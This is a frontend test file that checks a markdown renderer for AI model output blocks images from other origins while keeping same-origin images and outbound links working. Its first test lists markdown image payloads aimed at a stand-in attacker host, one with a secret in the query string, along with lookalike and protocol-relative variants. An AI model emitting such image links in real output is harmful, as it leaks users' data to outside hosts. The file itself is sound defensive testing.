import React from 'react'
import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import StreamdownMarkdown from '@/app/components/base/streamdown-markdown'

const imageSources = (container: HTMLElement) => [...container.querySelectorAll('img')].map(img => img.getAttribute('src'))

describe('images in model output', () => {
  it('does not load images from other origins', () => {
    const { container } = render(<StreamdownMarkdown content={[
      '![external](https://evil.example/t.png?q=secret)',
      '![lookalike](https://localhost.evil.example/t.png)',
      '![userinfo](https://localhost@evil.example/t.png)',
      '![protocol-relative](//evil.example/t.png)',
      '![data](data:image/png;base64,AAAA)',
    ].join(' ')} />)
    expect(imageSources(container)).toEqual([])
    expect(container.querySelector('link[rel="preload"]')).toBeNull()
    expect(screen.getByText(/Image blocked:.*external/)).toBeTruthy()
  })

  it('shows this app\'s own images', () => {
    const { container } = render(<StreamdownMarkdown content={`![relative](/rich-cards/a.svg) ![same](${window.location.origin}/b.png)`} />)
    expect(imageSources(container)).toEqual(['/rich-cards/a.svg', `${window.location.origin}/b.png`])
  })

  it('keeps links to any site clickable', () => {
    render(<StreamdownMarkdown content="[事例](https://other.example/case)" />)
    const link = screen.getByRole('link', { name: '事例' })
    expect(link.getAttribute('href')).toBe('https://other.example/case')
    expect(link.getAttribute('rel')).toContain('noopener')
  })
})
